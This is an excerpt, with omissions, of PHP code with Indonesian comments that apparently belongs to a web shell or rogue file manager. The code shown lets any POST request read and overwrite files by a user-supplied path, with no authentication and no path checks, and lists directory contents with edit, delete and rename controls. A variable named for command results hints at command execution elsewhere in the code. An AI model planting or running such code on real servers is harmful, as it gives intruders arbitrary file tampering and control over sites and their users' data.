...
elseif (isset($_POST['edit_file'])) {
    $filePath = $currentDirectory . '/' . $_POST['edit_file'];

    // Pastikan yang dipilih adalah file, bukan direktori
    if (is_dir($filePath)) {
        $viewCommandResult = '<hr><p class="text-red-500">Error: Selected path is a directory, not a file!</p>';
    } elseif (!file_exists($filePath)) {
        $viewCommandResult = '<hr><p class="text-red-500">Error: File not found!</p>';
    } else {
        // Jika ada konten yang dikirim untuk disimpan
        if (isset($_POST['save_content'])) {
            if (is_writable($filePath)) {
                $saveResult = file_put_contents($filePath, $_POST['save_content']);
                if ($saveResult !== false) {
                    $viewCommandResult = '<hr><p class="text-green-500">File saved successfully!</p>';
                } else {
                    $viewCommandResult = '<hr><p class="text-red-500">Error: Failed to save file!</p>';
                }
            } else {
                $viewCommandResult = '<hr><p class="text-red-500">Error: File is not writable!</p>';
            }
        }

        // Tampilkan form editor file
        $fileContent = htmlspecialchars(file_get_contents($filePath));

        $viewCommandResult .= '
            <hr>
            <p class="font-bold text-lg text-gray-300">Editing file: ' . htmlspecialchars($_POST['edit_file']) . '</p>
            <form method="post" class="mt-4">
                <textarea name="save_content" rows="20" class="w-full p-3 bg-gray-800 text-gray-300 border border-gray-600 rounded-md">' . $fileContent . '</textarea>
                <input type="hidden" name="edit_file" value="' . htmlspecialchars($_POST['edit_file']) . '">
                <button type="submit" class="mt-3 px-4 py-2 bg-green-600 hover:bg-green-700 text-white rounded-md">Save File</button>
            </form>';
    }
}
}
    ...
    echo '<thead><tr class="bg-gray-700"><th class="px-4 py-2">Item Name</th><th class="px-4 py-2">Size</th><th class="px-4 py-2">Date</th><th class="px-4 py-2">Permissions</th><th class="px-4 py-2">View/Edit</th><th class="px-4 py-2">Delete</th><th class="px-4 py-2">Rename</th></tr></thead>';
    echo '<tbody>';
    foreach (scandir($currentDirectory) as $v) {
        ...
        echo '<tr class="' . ($writable ? 'bg-gray-600' : 'bg-gray-700') . '">
                ...
                <form method="post" action="?' . (isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '') . '">
                    <input type="hidden" name="edit_file" value="' . htmlspecialchars($v) . '"><center><input type="submit" value="Edit" class="bg-blue-500 hover:bg-blue-600 text-white rounded-md p-2"></center></form></td>
